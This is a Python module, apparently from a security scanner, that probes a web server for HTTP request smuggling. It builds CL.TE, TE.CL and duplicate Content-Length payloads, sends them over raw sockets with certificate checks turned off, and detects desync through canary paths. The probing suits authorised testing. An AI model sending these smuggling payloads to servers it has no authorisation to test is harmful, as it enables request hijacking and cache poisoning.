from socket import create_connection, socket, timeout as SocketTimeout
from ssl import CERT_NONE, create_default_context
from typing import Dict, List, Optional, Tuple

from lib.canary import CanaryGenerator


DRAIN_TIMEOUT = 0.6


class ParserDiscrepancyEngine:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    @staticmethod
    def _status_of(data: bytes) -> int:
        if not data:
            return -1
        first = data.split(b"\r\n", 1)[0]
        parts = first.split(b" ", 2)
        if len(parts) < 2:
            return -1
        try:
            return int(parts[1])
        except ValueError:
            return -1

    def _exchange(self, prefix: bytes, victim: bytes) -> Dict[str, object]:
        early = b""
        late = b""
        closed_after_prefix = False
        early_status = -1
        victim_status = -1
        try:
            sock = self._connect()
        except OSError:
            return {"early": b"", "late": b"", "closed_after_prefix": True,
                    "early_status": -1, "victim_status": -1}
        try:
            try:
                sock.sendall(prefix)
            except OSError:
                return {"early": b"", "late": b"", "closed_after_prefix": True,
                        "early_status": -1, "victim_status": -1}
            early = self._drain(sock)
            early_status = self._status_of(early)
            try:
                sock.sendall(victim)
            except OSError:
                closed_after_prefix = True
            else:
                late = self._drain(sock)
                victim_status = self._status_of(late)
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return {
            "early": early,
            "late": late,
            "closed_after_prefix": closed_after_prefix,
            "early_status": early_status,
            "victim_status": victim_status,
        }

    def _common_probe(self, prefix: bytes, endpoint: str, host_header: str,
                      canary_path: str, label: str) -> Dict[str, object]:
        victim = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        result = self._exchange(prefix, victim)
        early = result["early"]
        late = result["late"]
        early_hit = self.canary.validate(early, canary_path)
        late_hit = self.canary.validate(late, canary_path)
        discrepancy = late_hit and not early_hit
        early_status = result["early_status"]
        victim_status = result["victim_status"]
        victim_diverged = (
            victim_status > 0
            and early_status > 0
            and victim_status != early_status
        )
        needs_escalation = (
            not discrepancy
            and (result["closed_after_prefix"] or victim_diverged)
        )
        return {
            "type": label,
            "canary_path": canary_path,
            "early_hit": early_hit,
            "late_hit": late_hit,
            "discrepancy": discrepancy,
            "closed_after_prefix": result["closed_after_prefix"],
            "early_status": early_status,
            "victim_status": victim_status,
            "victim_diverged": victim_diverged,
            "needs_escalation": needs_escalation,
            "raw": prefix,
        }

    def probe_cl_te(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        chunk_data = f"0\r\n\r\n{smuggled}"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: {len(chunk_data.encode('latin-1'))}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_data}"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path, "CL.TE")

    def probe_te_cl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(smuggled):x}\r\n"
            f"{smuggled}"
            f"0\r\n"
            f"\r\n"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path, "TE.CL")

    def probe_duplicate_cl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 5\r\n"
            f"Content-Length: {len(smuggled.encode('latin-1'))}\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path,
                                  "DUPLICATE_CL")

    def run_all(self, endpoint: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_cl_te, self.probe_te_cl, self.probe_duplicate_cl):
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "discrepancy": False, "needs_escalation": False})
        return results
